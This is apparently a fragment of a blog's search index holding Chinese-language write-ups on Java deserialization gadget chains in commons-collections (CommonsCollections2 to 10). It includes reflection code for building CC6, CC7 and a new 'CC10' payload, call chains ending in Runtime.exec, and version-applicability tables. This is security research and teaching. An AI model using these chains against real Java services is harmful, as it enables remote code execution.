\u5229\u7528\u94fe\u6784\u9020","text":"<p>CommonsCollections6\u548c7\u7684exp\u6784\u9020\u6bd4\u8f83\u590d\u6742\uff0c\u8fd9\u91cc\u5355\u72ec\u62ff\u51fa\u6765\u8bb2\u4e00\u4e0b\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#commonscollections6","title":"CommonsCollections6","text":"<p>\u7ecf\u8fc7\u524d\u9762\u7684\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053CommonsCollections6\u9700\u8981\u5c06\u6784\u9020\u597d\u7684TiedMapEntry\u5b9e\u4f8b\u6dfb\u52a0\u5230HashSet\u7684\u503c\u4e0a\u3002</p> <p>\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u76f4\u63a5add</p> <pre><code>TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");\nHashSet map = new HashSet(1);\nmap.add(entry);\n</code></pre> <p>\u590d\u6742\u4e00\u70b9\uff0c\u5c31\u662fysoserail\u91cc\u7684\u5b9e\u73b0\u65b9\u6cd5\uff0c\u91c7\u7528\u53cd\u5c04\u673a\u5236\u6765\u5b8c\u6210</p> <p>\u5176\u601d\u8def\u4e3b\u8981\u4e3a\uff1a</p> <ul> <li>\u5b9e\u4f8b\u5316\u4e00\u4e2aHashSet\u5b9e\u4f8b</li> <li>\u901a\u8fc7\u53cd\u5c04\u673a\u5236\u83b7\u53d6HashSet\u7684map\u7c7b\u5c5e\u6027</li> <li>\u901a\u8fc7\u53cd\u5c04\u673a\u5236\u83b7\u53d6HashMap(map\u7c7b\u5c5e\u6027)\u7684table(Node)\u7c7b\u5c5e\u6027 <li>\u901a\u8fc7\u53cd\u5c04\u673a\u5236\u83b7\u53d6Node\u7684key\u7c7b\u5c5e\u6027\uff0c\u5e76\u8bbe\u7f6e\u8be5key\u7684\u503c\u4e3a\u6784\u9020\u597d\u7684TiedMapEntry\u5b9e\u4f8b</li> <p>\u5177\u4f53\u4ee3\u7801\u5982\u4e0b</p> <pre><code>HashSet map = new HashSet(1);\nmap.add(\"foo\");\nField f = null;\ntry {\n    f = HashSet.class.getDeclaredField(\"map\");//\u83b7\u53d6HashSet\u7684map Field\u5bf9\u8c61\n} catch (NoSuchFieldException e) {\n    f = HashSet.class.getDeclaredField(\"backingMap\");\n}\nPermit.setAccessible(f);// \u8bbe\u7f6emap\u53ef\u88ab\u8bbf\u95ee\u4fee\u6539\nHashMap innimpl = null;\ninnimpl = (HashMap) f.get(map);// \u83b7\u53d6map\u5b9e\u4f8b\u7684map\u7c7b\u5c5e\u6027\n\nField f2 = null;\ntry {\n  f2 = HashMap.class.getDeclaredField(\"table\");// \u83b7\u53d6HashMap\u7684 table field\n} catch (NoSuchFieldException e) {\n  f2 = HashMap.class.getDeclaredField(\"elementData\");\n}\nPermit.setAccessible(f2);// \u8bbe\u7f6eHashMap\u7684field \u53ef\u88ab\u8bbf\u95ee\nObject[] array = new Object[0];\narray = (Object[]) f2.get(innimpl);\nObject node = array[0];// \u83b7\u53d6Node&lt;k,v&gt;\u5b9e\u4f8b\nif(node == null){\n  node = array[1];\n}\n\nField keyField = null;\ntry{\n  keyField = node.getClass().getDeclaredField(\"key\");// \u83b7\u53d6Node\u7684key field\n}catch(Exception e){\n  keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");\n}\nPermit.setAccessible(keyField);// \u8bbe\u7f6e\u8be5Field\u53ef\u88ab\u8bbf\u95ee\u4fee\u6539\nkeyField.set(node, entry);// \u5bf9node\u5b9e\u4f8b\u586b\u5145key\u7684\u503c\u4e3aTiedMapEntry\u5b9e\u4f8b\n</code></pre> <p>\u7ecf\u8fc7\u4e0a\u9762\u7684\u64cd\u4f5c\uff0c\u6700\u7ec8\u7684HashSet\u5b9e\u4f8b\u88ab\u6211\u4eec\u5d4c\u5165\u4e86\u6784\u9020\u597d\u7684TiedMapEntry\u5b9e\u4f8b\u3002</p> <p>\u8fd9\u91cc\u5728\u8c03\u8bd5\u7684\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0\u7528ysoserail\u7684Reflections\u6765\u7b80\u5316exp\uff0c\u51fa\u6765\u7684\u7ed3\u679c\u6709\u70b9\u4e0d\u4e00\u6837\uff0c\u8fd8\u6ca1\u6709\u627e\u5230\u5177\u4f53\u7684\u539f\u56e0\u3002\u5982\u679c\u6709\u5e08\u5085\u9047\u5230\u8fc7\u8fd9\u79cd\u95ee\u9898\uff0c\u6b22\u8fce\u4e00\u8d77\u8ba8\u8bba\u8ba8\u8bba\uff01</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#commonscollections7","title":"CommonsCollections7","text":"<p>CommonsCollections\u5229\u7528\u7684\u662fkey\u7684hash\u51b2\u7a81\u7684\u65b9\u6cd5\u6765\u89e6\u53d1<code>equals</code>\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u4f1a\u8c03\u7528<code>LazyMap.get</code>\u51fd\u6570</p> <p>\u90a3\u4e48\u6784\u9020exp\u7684\u5173\u952e\u5c31\u662f\u6784\u9020\u4e00\u4e2ahash\u51b2\u7a81\u7684LazyMap\u4e86\u3002</p> <p>\u8fd9\u91cc\u5927\u5bb6\u53ef\u4ee5\u8ddf\u4e00\u4e0bString.hashCode\u51fd\u6570\uff0c\u4ed6\u7684\u8ba1\u7b97\u65b9\u6cd5\u5b58\u5728\u4e0d\u540c\u5b57\u7b26\u4e32\u76f8\u540chash\u7684\u53ef\u80fd\u6027\uff0c\u4f8b\u5982\u5982\u4e0b\u4ee3\u7801</p> <p></p> <p>CommonsCollections7\u7528\u7684\u5c31\u662f\u8fd9\u4e2abug\u6765\u5236\u9020hash\u51b2\u7a81\u3002</p> <p>\u8fd9\u91cc\u9700\u8981\u63d0\u4e00\u70b9\u7684\u662f\u89e6\u53d1LazyMap.get\u51fd\u6570</p> <p></p> <p>\u8981\u8d70\u5230\u7b2c151\u884c\u7ea2\u6846\u6846\u4e0a\uff0c\u9996\u5148\u9700\u8981\u6ee1\u8db3\u7684\u662f<code>map</code>\u91cc\u4e0d\u5b58\u5728\u5f53\u524d\u8fd9\u4e2a<code>key</code></p> <p>\u4f46\u662f\u660e\u663e\u5728\u7b2c\u4e00\u6b21\u4e0d\u5b58\u5728\u8fd9\u4e2a<code>key</code>\u540e\uff0c\u4f1a\u66f4\u65b0<code>map</code>\u7684\u952e\u503c\uff0c\u8fd9\u5c06\u5bfc\u81f4\u4e0b\u6b21\u540c\u6837\u7684<code>key</code>\u8fdb\u6765\uff0c\u5c31\u4e0d\u4f1a\u89e6\u53d1\u540e\u7eed\u7684payload\u4e86\u3002\u6211\u4eec\u5728\u5199exp\u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f\u5230\u8fd9\u4e00\u70b9\u3002</p> <p>\u6765\u770b\u4e00\u4e0bysoserial\u7684CommonsCollections7\u662f\u600e\u4e48\u7f16\u5199\u7684\uff01</p> <pre><code>Map innerMap1 = new HashMap();\nMap innerMap2 = new HashMap();\n\n// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject\nMap lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);\nlazyMap1.put(\"yy\", 1);\n\nMap lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);\nlazyMap2.put(\"zZ\", 1);\n\n// Use the colliding Maps as keys in Hashtable\nHashtable hashtable = new Hashtable();\nhashtable.put(lazyMap1, 1);\nhashtable.put(lazyMap2, 2);\n\nReflections.setFieldValue(transformerChain, \"iTransformers\", transformers);\n// Needed to ensure hash collision after previous manipulations\nlazyMap2.remove(\"yy\");\n</code></pre> <p>\u5176\u4e2d\u7b2c\u4e24\u6b21\u7684put\u4f1a\u4f7f\u5f97\u4f1a\u4f7f\u5f97LazyMap2\u4e2d\u589e\u52a0\u4e86yy\u8fd9\u4e2a\u952e\u503c\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u53cd\u5e8f\u5217\u5316\u540e\u4ecd\u7136\u53ef\u4ee5\u89e6\u53d1\u540e\u7eed\u7684\u5229\u7528\u94fe\uff0c\u8fd9\u91cc\u9700\u8981\u5c06lazyMap2\u7684yy\u952e\u503cremove\u6389\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#6-commonscollections10","title":"6. \u6784\u9020\u65b0CommonsCollections10","text":"<p>\u7ecf\u8fc7\u5bf9\u524d\u97621,3,5,6,7\u7684\u5206\u6790\uff0c\u6211\u4eec\u5176\u5b9e\u53ef\u4ee5\u53d1\u73b0\u5f88\u591apayload\u90fd\u662f\u201c\u6742\u4ea4\u201d\u7684\u6210\u679c\u3002\u90a3\u4e48\u6211\u4eec\u662f\u5426\u80fd\u6839\u636e\u524d\u9762\u7684\u5206\u6790\uff0c\u6784\u9020\u51fa\u4e00\u4e2a\u65b0\u7684CommonsCollections\u7684payload\u5462\uff1f\u7b54\u6848\u5f53\u7136\u662f\u80af\u5b9a\u7684\uff0c\u63a5\u4e0b\u6765\u8bb2\u4e00\u4e0b\u6211\u627e\u5230\u7684\u4e00\u4e2a\u65b0payload\u5229\u7528\u3002</p> <p>\u8fd9\u4e2apayload\u4e3aCommonsCollections6\u548c7\u7684\u7ed3\u5408\uff0c\u540cCommonsCollections6\u7c7b\u4f3c\uff0c\u8fd9\u91cc\u4e5f\u7528\u5230\u4e86<code>TiedMapEntry</code>\u7684<code>hashCode</code>\u51fd\u6570</p> <p>\u6211\u4eec\u5728\u5206\u6790<code>Hashtable</code>\u7684<code>reconstitutionPut</code>\u51fd\u6570\u65f6\uff0c\u770b\u4e0b\u56fe</p> <p></p> <p>\u8be5\u51fd\u6570\u5728\u7b2c1234\u884c\u5bf9<code>key</code>\u8c03\u7528\u4e86\u4e00\u6b21<code>hashCode</code>\u51fd\u6570\uff0c\u90a3\u4e48\u5f88\u660e\u663e\uff0c\u5982\u679ckey\u503c\u88ab\u4ee3\u66ff\u4e3a\u6784\u9020\u597d\u7684<code>TiedMapEntry</code>\u5b9e\u4f8b\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u80fd\u89e6\u53d1<code>LazyMap.get</code>\u51fd\u6570\uff0c\u540e\u7eed\u7684\u8c03\u7528\u94fe\u5c31\u7c7b\u4f3c\u4e86\u3002</p> <p>\u6574\u7406\u4e00\u4e0b\u5229\u7528\u94fe</p> <pre><code>Hashtable.readObject()\n    -&gt; Hashtable.reconstitutionPut\n    -&gt; key.hashCode() =&gt; TiedMapEntry.hashCode()\n    -&gt; TiedMapEntry.getValue\n    -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()\n    -&gt; factory.transform() =&gt; ChainedTransformer.transform()\n    -&gt; \u524d\u6587\u6784\u9020\u7684Runtime.getRuntime().exec()\n</code></pre> <p>\u5176\u5b9e\u4ece\u5229\u7528\u94fe\u6765\u770b\uff0c\u4e0eCommonsCollections6\u7684\u533a\u522b\u5728\u4e8e\u524d\u90e8\u7684\u89e6\u53d1\u4f7f\u7528\u4e86\u4e0d\u540c\u7684\u5bf9\u8c61\u3002</p> <p>\u63a5\u4e0b\u6765\uff0c\u7ed3\u5408\u7b2c5\u70b9\u7684\u5b66\u4e60\uff0c\u6211\u4eec\u6765\u5199\u4e00\u4e0b\u8fd9\u4e2apayload\u7684\u5229\u7528\u94feexp</p> <pre><code>final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});\n\nfinal Map innerMap = new HashMap();\nfinal Map innerMap2 = new HashMap();\n\nfinal Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n\nTiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");\nHashtable hashtable = new Hashtable();\nhashtable.put(\"foo\",1);\n// \u83b7\u53d6hashtable\u7684table\u7c7b\u5c5e\u6027\nField tableField = Hashtable.class.getDeclaredField(\"table\");\nPermit.setAccessible(tableField);\nObject[] table = (Object[])tableField.get(hashtable);\nObject entry1 = table[0];\nif(entry1==null)\n    entry1 = table[1];\n// \u83b7\u53d6Hashtable.Entry\u7684key\u5c5e\u6027\nField keyField = entry1.getClass().getDeclaredField(\"key\");\nPermit.setAccessible(keyField);\n// \u5c06key\u5c5e\u6027\u7ed9\u66ff\u6362\u6210\u6784\u9020\u597d\u7684TiedMapEntry\u5b9e\u4f8b\nkeyField.set(entry1, entry);\n// \u586b\u5145\u771f\u6b63\u7684\u547d\u4ee4\u6267\u884c\u4ee3\u7801\nReflections.setFieldValue(transformerChain, \"iTransformers\", transformers);\nreturn hashtable;\n</code></pre>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#7-commonscollections9","title":"7. \u6885\u5b50\u9152\u5e08\u5085\u7684CommonsCollections9","text":"<p>\u627e\u5230\u4e0a\u9762CommonsCollections10\u65f6\uff0c\u5728\u7f51\u4e0a\u627e\u4e86\u4e00\u4e0b\u6709\u6ca1\u6709\u5e08\u5085\u5df2\u7ecf\u6316\u5230\u8fc7\u4e86\uff0c\u4e00\u5171\u627e\u5230\u4e0b\u9762\u4e09\u4f4d\u5e08\u5085</p> <ul> <li>https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java</li> <li>https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d</li> <li>https://github.com/frohoff/ysoserial/pull/116</li> </ul> <p>\u4e00\u4e2a\u4e00\u4e2a\u6765\u8bf4</p> <ol> <li> <p>\u7b2c\u4e00\u4e2aJayl1n\u5e08\u5085\u505a\u7684\u6539\u53d8\u4e3b\u8981\u662f\u6700\u7ec8\u7684Runtime.getRuntime().exec\u6539\u6210\u4e86URLClassLoader.loadClass().newInstance\u7684\u65b9\u5f0f\uff0c\u524d\u9762\u7528\u7684\u8fd8\u662fCommonsCollections6\uff0c\u8fd9\u91cc\u6682\u65f6\u4e0d\u5c06\u5176\u5f52\u7c7b\u4e3a\u65b0\u7684\u5229\u7528\u94fe\u3002</p> </li> <li> <p>\u7b2c\u4e8c\u4e2a\u662f\u6885\u5b50\u9152\u5e08\u5085\u63d0\u4ea4\u7684CommonsCollections9\uff0c\u4e3b\u8981\u5229\u7528\u7684\u662fCommonsCollections:3.2\u7248\u672c\u65b0\u589e\u7684<code>DefaultedMap</code>\u6765\u4ee3\u66ff<code>LazyMap</code>\uff0c\u56e0\u4e3a\u8fd9\u4e24\u4e2aMap\u6709\u540c\u6837\u7684get\u51fd\u6570\u53ef\u4ee5\u88ab\u5229\u7528\uff0c\u8fd9\u91cc\u4e0d\u518d\u5177\u4f53\u5206\u6790\u3002</p> </li> <li>\u7b2c\u4e09\u4e2a\u662fnavalorenzo\u5e08\u5085\u63d0\u4ea4\u7684CommonsCollections8\uff0c\u5176\u5229\u7528\u94fe\u57fa\u4e8eCommonsCollections:4.0\u7248\u672c\uff0c\u6682\u65f6\u4e0d\u5728\u672c\u7bc7\u6587\u7ae0\u7684\u5206\u6790\u8303\u56f4\u5185\uff0c\u540e\u9762\u4f1a\u597d\u597d\u5206\u6790\u4e00\u4e0b\u3002</li> </ol>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#0x03","title":"0x03 \u603b\u7ed3","text":"<p>\u8054\u5408\u524d\u9762\u4e24\u7bc7\u6587\u7ae0CommonsCollections1\u3001CommonsCollections3\uff0c\u5728\u52a0\u4e0a\u672c\u6587\u7684CommonsCollections5\uff0c6\uff0c7\uff0c9\uff0c10\u3002</p> <p>\u7531\u4e8e\u7f51\u4e0a\u5df2\u7ecf\u6709\u7c7b\u4f3c\u7684\u6587\u7ae0\u505a\u4e86\u603b\u7ed3\uff0c\u8fd9\u91cc\u5c31\u7b80\u5355\u505a\u4e00\u4e0bCommonsCollections&lt;=3.2.1\u4e0b\u7684\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u7684\u603b\u7ed3\u3002</p> <ul> <li>\u8d77\u59cb\u70b9</li> <li><code>AnnotationInvocationHandler</code>\u7684<code>readObject</code></li> <li><code>BadAttributeValueExpException</code>\u7684<code>readObject</code></li> <li><code>HashSet</code>\u7684<code>readObject</code></li> <li><code>Hashtable</code>\u7684<code>readObject</code></li> <li>\u91cd\u8981\u7684\u627f\u63a5\u70b9</li> <li><code>LazyMap</code>\u7684<code>get</code></li> <li><code>DefaultedMap</code>\u7684<code>get</code></li> <li><code>TiedMapEntry</code>\u7684<code>getValue</code></li> <li><code>Proxy</code>\u7684<code>invoke</code></li> <li>\u7ec8\u70b9</li> <li><code>ChainedTransformer</code>\u7684<code>transform</code></li> <li><code>InvokerTransformer</code>\u7684<code>transform</code></li> <li><code>ConstantTransformer</code>\u7684<code>transform</code></li> </ul> <p>\u5404exp\u7684jdk\u9002\u7528\u7248\u672c</p> <ol> <li>jdk7 =&gt; CommonsCollection1\u30013</li> <li>jdk7 &amp; jdk8 =&gt; CommonsCollections5,6,7,9,10</li> </ol> <p>\u5404exp\u7684commons-collections\u9002\u7528\u7248\u672c</p> <ol> <li>commons-collections&lt;=3.1 CommonsCollections1,3,5,6,7,10</li> <li>commons-collections&lt;=3.2.1 CommonsCollections1,3,5,6,7,9,10</li> </ol> <p>\u6700\u540e\u7684\u6700\u540e\uff0ccommons-collections:3.x\u7248\u672c\u7684\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u5c31\u5206\u6790\u5230\u8fd9\u91cc\uff0c\u5176\u5b9e\u6211\u76f8\u4fe1\u5982\u679c\u60f3\u7ee7\u7eed\u6316\u53ef\u4ee3\u66ff\u7684\u5229\u7528\u94fe\u8fd8\u662f\u4f1a\u6709\u7684\uff0c\u5c31\u50cf\u672c\u6587\u6316\u5230\u7684CommonsCollections10\uff0c\u5982\u679c\u5404\u4f4d\u5e08\u5085\u6709\u5174\u8da3\u53ef\u4ee5\u7ee7\u7eed\u6316\u4e0b\u53bb\uff0c\u4e5f\u6b22\u8fce\u548c\u5404\u4f4d\u5e08\u5085\u4e00\u8d77\u4ea4\u6d41\u3002</p> <p>\u540e\u7eed\u8fd8\u4f1a\u628acommons-collections:4\u7248\u672c\u7684\u5229\u7528\u94fe\u505a\u4e00\u4e2a\u5206\u6790\uff0c\u6b22\u8fce\u4e00\u8d77\u4ea4\u6d41\uff1a\uff09</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/","title":"Java\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6316\u6398\u4e4bCommonsCollections2,4,8","text":"","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#0x00","title":"0x00 \u524d\u8a00","text":"<p>\u524d\u9762\u51e0\u7bc7\u6587\u7ae0\uff0c\u5206\u6790\u4e86CommonsCollections:3.2.1\u7248\u672c\u4ee5\u4e0b\u5b58\u5728\u7684\u53cd\u5e8f\u5217\u5316\u94fe\u3002\u4eca\u5929\u5c06\u7ee7\u7eed\u5206\u6790CommonsCollections:4.0\u7248\u672c\uff0c\u4e3b\u8981\u8bb2\u8ff0CommonsCollections2\uff0c4\uff0c8\u7684\u5229\u7528\u94fe\u6784\u9020\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#0x01","title":"0x01 \u524d\u666f\u56de\u987e","text":"<p>commons-collections:4.0\u7248\u672c\u5176\u5b9e\u5e76\u6ca1\u6709\u50cf3.2.2\u7248\u672c\u7684\u4fee\u590d\u65b9\u5f0f\u4e00\u6837\u505a\u62c9\u9ed1\u5904\u7406\uff0c\u6240\u4ee5\u57283.2.1\u53ca\u4ee5\u4e0b\u7684\u5229\u7528\u94fe\u6539\u6539\u8fd8\u662f\u53ef\u4ee5\u7528\u7684\u3002 \u4f8b\u5982CommonsCollections5</p> <pre><code>final Map&lt;String, String&gt; innerMap = new HashMap();\nfinal Map lazyMap = LazyMap.lazyMap(innerMap, transformerChain);\n</code></pre> <p>\u5c06innerMap\u6539\u6210\u952e\u503c\u5bf9\u7684\u7533\u660e\u65b9\u5f0f\u5373\u53ef\uff0c\u4f46\u662f\u5927\u5bb6\u662f\u4e0d\u662f\u8fd8\u8bb0\u5f97\uff0c\u9664\u4e86\u7528LazyMap\u7684\u65b9\u5f0f\uff0cCommonsCollections3\u66fe\u63d0\u5230\u8fc7\u4f7f\u7528<code>TrAXFilter</code>\u7c7b\u521d\u59cb\u5316\u7684\u65b9\u5f0f\u6765\u8f7d\u5165\u4efb\u610f\u7684class bytes\u6570\u7ec4\u3002</p> <p>commons-collections:4.0\u7248\u672c\u4e0b\u7684\u5229\u7528\u94fe\uff0c\u7528\u7684\u90fd\u662fTemplatesImpl\u4f5c\u4e3a\u6700\u7ec8\u7684\u547d\u4ee4\u6267\u884c\u7684\u4ee3\u7801\u8c03\u7528\uff0c\u7531\u4e8e\u524d\u9762\u5206\u6790\u8fc7\u8fd9\u4e2a\u5229\u7528\u65b9\u5f0f\uff0c\u540e\u6587\u4e0d\u518d\u590d\u8ff0\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#0x02","title":"0x02 \u5229\u7528\u94fe\u5206\u6790","text":"","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#1-commonscollections24","title":"1. CommonsCollections2,4","text":"<p>CommonsCollections2,4\u90fd\u7528\u5230\u4e86\u4e00\u4e2a\u65b0\u7684\u7c7b<code>PriorityQueue</code>\u7684<code>Comparator</code>\u6765\u89e6\u53d1<code>transform</code>\u51fd\u6570\uff0c\u4e24\u8005\u7684\u533a\u522b\u5728\u4e8e\u4e2d\u95f4\u7684\u6865\u63a5\u7528\u7684\u4e0d\u540c\u7684Transformer\u5bf9\u8c61\u3002\u5148\u6765\u770b\u4e00\u4e0b<code>PriorityQueue.readObject</code></p> <p></p> <p>\u6846\u6846\u91cc\u7684\u4e3b\u8981\u5de5\u4f5c\u4e3a\u53cd\u5e8f\u5217\u5316\u6062\u590d\u8be5\u5bf9\u8c61\u7684\u6570\u636e\uff0c\u6211\u4eec\u91cd\u70b9\u5173\u6ce8<code>heapify()</code></p> <p></p> <p>\u7ee7\u7eed\u8ddf\u8fdb<code>siftDown</code></p> <p></p> <p>\u5f53\u6211\u4eec\u5728\u5b9e\u4f8b\u5316\u5bf9\u8c61\u65f6\u63d0\u4f9b\u4e86<code>comparator</code>\uff0c\u5c06\u4f1a\u6765\u5230\u6211\u4eec\u6700\u7ec8\u89e6\u53d1compare\u7684\u4f4d\u7f6e\uff0c\u770b\u4e00\u4e0b<code>siftDownUsingComparator</code></p> <p></p> <p>\u8fd9\u91cc\u8c03\u7528\u4e86\u6211\u4eec\u4f20\u5165\u7684comparator\uff0c\u5e76\u8c03\u7528\u5176compare\uff0c\u5229\u7528\u94fe\u4e2d\u4f7f\u7528\u4e86<code>TransformingComparator</code>,\u6765\u770b\u4e00\u4e0b\u5b83\u7684compare\u51fd\u6570</p> <p></p> <p>\u8c03\u7528\u4e86\u5f53\u524d\u7684transformer\u7684transform\u51fd\u6570\uff0c\u770b\u5230\u8fd9\u91cc\uff0c\u5176\u5b9e\u5df2\u7ecf\u5f88\u719f\u4e86\uff0c\u524d\u9762\u5206\u6790\u7684\u5f88\u591a\u5229\u7528\u94fe\u90fd\u8ddftransform\u6709\u5173\uff0c\u5e76\u4e144.0\u7248\u672c\u5e76\u6ca1\u6709\u62c9\u9ed1\u76f8\u5173\u7684transformer\u3002\u6240\u4ee5\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u7528\u524d\u9762\u7684\u4e00\u4e9b\u601d\u8def\u4e86\u3002</p> <ol> <li>CommonsCollections2</li> </ol> <p>CommonsCollections2\u5229\u7528\u4e86InvokerTransformer\u7c7b\u7684\u4efb\u610f\u7c7b\u51fd\u6570\u8c03\u7528\u7684transform\uff0c\u4f20\u5165\u6784\u9020\u597d\u7684templates gadget\u5e76\u8c03\u7528    <code>TemplatesImpl.newTransformer</code></p> <ol> <li>CommonsCollections4</li> </ol> <p>CommonsCollections4\u540e\u7eed\u7528\u7684\u65b9\u6cd5\u540cCommonsCollections3\u4e00\u6837\uff0c\u7528<code>InstantiateTransformer</code>\u6765\u89e6\u53d1<code>TrAXFilter</code>\u7684\u521d\u59cb\u5316\uff0c\u6700\u7ec8\u4e5f\u5c06\u8c03\u7528<code>TemplatesImpl.newTransformer</code></p> <p>\u6574\u7406\u4e00\u4e0b\u5229\u7528\u94fe</p> <pre><code>CommonsCollection2:\nPriorityQueue.readObject\n    -&gt; PriorityQueue.heapify()\n    -&gt; PriorityQueue.siftDown()\n    -&gt; PriorityQueue.siftDownUsingComparator()\n    -&gt; TransformingComparator.compare()\n    -&gt; InvokerTransformer.transform()\n    -&gt; TemplatesImpl.newTransformer()\n    ... templates Gadgets ...\n    -&gt; Runtime.getRuntime().exec()\n\nCommonsCollection4:\nPriorityQueue.readObject\n    -&gt; PriorityQueue.heapify()\n    -&gt; PriorityQueue.siftDown()\n    -&gt; PriorityQueue.siftDownUsingComparator()\n    -&gt; TransformingComparator.compare()\n    -&gt; ChainedTransformer.transform()\n    -&gt; InstantiateTransformer.transform()\n    -&gt; TemplatesImpl.newTransformer()\n    ... templates Gadgets ...\n    -&gt; Runtime.getRuntime().exec()\n</code></pre>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#2commonscollections8","title":"2.CommonsCollections8","text":"<p>CommonsCollections8\u662f\u4eca\u5e74navalorenzo\u63a8\u9001\u5230ysoserial\u4e0a\u7684\uff0c8\u4e0e2\uff0c4\u7684\u533a\u522b\u5728\u4e8e\u4f7f\u7528\u4e86\u65b0\u7684readObject\u89e6\u53d1\u70b9<code>TreeBag</code></p> <p>\u6765\u770b\u4e00\u4e0b<code>TreeBag.readObject</code></p> <p></p> <p>\u8fd9\u91cc\u7684\u4e24\u4e2a\u5173\u952e\u70b9<code>TreeBag</code>\u7684\u7236\u7c7b\u7684<code>doReadObject</code>\u51fd\u6570\u548c<code>TreeMap</code>.</p> <p>\u770b\u4e00\u4e0b<code>doReadObject</code></p> <p></p> <p>\u8fd9\u91cc\u5bf9\u4f20\u5165\u7684TreeMap\u8c03\u7528\u4e86<code>put</code>\u51fd\u6570</p> <p></p> <p>\u7ee7\u7eed\u8ddf\u8fdb<code>compare</code>\u51fd\u6570</p> <p></p> <p>\u8fd9\u91cc\u53c8\u56de\u5230\u4e86\u719f\u6089\u7684<code>comparator.compare</code>\u51fd\u6570\uff0c\u5176\u4e2d<code>comparator</code>\u5c31\u662f\u6211\u4eec\u6784\u9020\u7684<code>TransformingComparator</code></p> <p>\u540e\u7eed\u8ddfCommonsCollections2\u76f8\u540c\uff0c\u5c31\u4e0d\u590d\u8ff0\u4e86\u3002</p> <p>\u6574\u7406\u4e00\u4e0b\u5229\u7528\u94fe</p> <pre><code>TreeBag.readObject()\n    -&gt; AbstractMapBag.doReadObject()\n    -&gt; TreeMap.put()\n    -&gt; TransformingComparator.compare()\n    -&gt; InvokerTransformer.transform()\n    -&gt; TemplatesImpl.newTransformer()\n    ... templates Gadgets ...\n    -&gt; Runtime.getRuntime().exec()\n</code></pre>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#3-commons-collections41","title":"3. commons-collections:4.1\u53ca\u4ee5\u4e0a\u7684\u6539\u53d8","text":"<p>\u524d\u9762\u63d0\u5230\u7684CommonsCollections2,4,8\uff0c\u90fd\u662f\u5728commons-collections:4.0\u7248\u672c\u4e0b\u624d\u53ef\u4ee5\u4f7f\u7528\u7684\u3002\u8fd9\u91cc\u6211\u4eec\u6765\u770b\u770b\u4e3a\u4ec0\u4e48\u57284.1\u53ca\u4ee5\u4e0a\u7248\u672c\u65e0\u6cd5\u5229\u7528\uff01</p> <p>\u524d\u9762\u6211\u4eec\u7528\u5230\u4e86InvokerTransformer\u548cInstantiateTransformer\u4f5c\u4e3a\u4e2d\u8f6c\uff0c\u5f88\u771f\u5b9e\uff0c4.1\u7248\u672c\u8fd9\u4e24\u4e2a\u7c7b\u90fd\u6ca1\u6709\u5b9e\u73b0Serializable\u63a5\u53e3\uff0c\u5bfc\u81f4\u6211\u4eec\u5728\u5e8f\u5217\u5316\u65f6\u5c31\u65e0\u6cd5\u5229\u7528\u8fd9\u4e24\u4e2a\u7c7b\u3002emmmmm\uff0c\u76f4\u63a5\u5e72\u6389\u4e86\u4e0a\u9762\u76842\uff0c4\uff0c8\u3002</p> <p></p> <p></p> <p>\u8fd9\u4e2a\u6539\u53d8\u610f\u5473\u7740\u6211\u4eec\u9700\u8981\u4ece\u5176\u4ed6\u53ef\u64cd\u4f5c\u5371\u9669\u65b9\u6cd5\u7684\u5bf9\u8c61\u4e86\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#0x03","title":"0x03 \u603b\u7ed3","text":"<p>\u5206\u6790\u5b8cysoserial\u91cc\u7684commons-collections\u7cfb\u5217\u7684payloads\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u603b\u7ed3\u4e00\u4e0bJava\u7684\u53cd\u5e8f\u5217\u5316\u6316\u6398\u601d\u8def\uff08\u4e0d\u6d89\u53ca\u6280\u672f\u70b9\uff0c\u4e2a\u4eba\u7684\u4e00\u4e9b\u60f3\u6cd5\uff09\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections4-20191105/#1","title":"1. 